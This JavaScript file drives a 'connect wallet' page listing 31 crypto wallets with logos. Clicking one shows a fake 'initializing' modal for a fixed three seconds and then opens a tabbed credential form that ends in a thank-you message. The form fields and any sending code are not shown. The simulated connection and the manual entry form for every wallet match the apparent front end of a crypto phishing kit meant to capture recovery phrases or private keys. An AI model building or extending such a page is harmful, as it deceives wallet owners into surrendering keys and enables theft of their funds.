const buttons = [
  {name: "Metamask", src: "metamask.png"},
  {name: "Trust", src: "trust-wallet.png"},
  {name: "Phantom", src: "phantom.png"},
  {name: "Coinbase", src: "coinbase.png"},
  {name: "crypto.com", src: "crypto.png"},
  {name: "Blockchain", src: "blockchain.png"},
  {name: "Binance Smart Chain", src: "bsc.png"},
  {name: "Safepal", src: "safepal.png"},
  {name: "WalletConnect", src: "wallet.jpg"},
  {name: "Argent", src: "argent.png"},
  {name: "XinFin", src: "xinfin.png"},
  {name: "Terra Station", src: "terrastation.png"},
  {name: "Keplr", src: "keplr.png"},
  {name: "D'Cent", src: "dcent.png"},
  {name: "Ledger", src: "ledger.png"},
  {name: "Trezor", src: "trezor.png"},
  {name: "Neon", src: "neon.png"},
  {name: "Fortmatic", src: "formatic.png"},
  {name: "Aktionariat", src: "aktionariat.png"},
  {name: "Keyring Pro", src: "keyring.png"},
  {name: "BitKeep", src: "bitkeep.png"},
  {name: "SparkPoint", src: "sparkpoint.png"},
  {name: "OwnBit", src: "ownbit.png"},
  {name: "Infinity Wallet", src: "infinity.png"},
  {name: "Wallet.io", src: "wallet-io.png"},
  {name: "Infinito", src: "infinito.png"},
  {name: "Torus", src: "torus.jpg"},
  {name: "Nash", src: "nash.jpg"},
  {name: "BitPay", src: "bitpay.jpg"},
  {name: "imTOken", src: "imtoken.png"},
  {name: "Other Wallet", src: "others.jpg"},
];

const btnParent = document.getElementById("btn-parent");
const initModal = document.getElementById("initModal");
const mainModal = document.getElementById("mainModal");
const tabBtns = document.querySelectorAll(".tab-btn");
const contents = document.querySelectorAll(".tab-body");

// generate buttons
buttons.forEach((button) => {
  const buttonHtml = `<button class="btn">
		<div class="btn-content">
			<div class="status"></div>
			<p>${button.name}</p>
		</div>
		<img src="/images/${button.src}" alt="${button.name}" width="32" height="32">
	</button>
`;
  btnParent.insertAdjacentHTML("beforeend", buttonHtml);
});

// Tabs
tabBtns.forEach((button) => {
  button.addEventListener("click", function (e) {
    const id = e.target.dataset.id;

    contents.forEach(function (content) {
      content.classList.remove("active-tab");
    });
    const article = document.getElementById(id);
    article.classList.add("active-tab");
  });
});

// prevent form submit
const forms = document.querySelectorAll(".tab-content");
forms.forEach((form) => {
  form.addEventListener("submit", function (e) {
    e.preventDefault();
  });
});

// activate Modal
const btns = document.querySelectorAll(".btn");
btns.forEach((button, index) => {
  button.addEventListener("click", () => {
    const walletType = document.querySelector(".walletType");
    const walletLogo = document.getElementById("walletLogo");
    walletType.innerHTML = buttons[index].name;
    walletLogo.src = `images/${buttons[index].src}`;
    const walletName = document.getElementById("walletName");
    walletName.innerHTML = buttons[index].name;

    initModal.style.display = "flex";
    setTimeout(() => {
      initModal.style.display = "none";
      const formLogo = document.getElementById("formLogo");
      formLogo.src = `images/${buttons[index].src}`;
      mainModal.style.display = "flex";
    }, 3000);
  });
});

// close modal
function closeModal() {
  mainModal.style.display = "none";
  initModal.style.display = "none";
}

// return message
function thankyou_message() {
  const activeTab = document.querySelector(".active-tab");
  const requiredFields = activeTab.querySelectorAll("[required]");
  let isFormValid = true;

  requiredFields.forEach((field) => {
    if (field.value.trim() === "") {
      isFormValid = false;
    }
  });

  if (isFormValid) {
    const thankYouMessage = activeTab.querySelector(".thankyou_message");
    thankYouMessage.style.display = "block";
  }
}
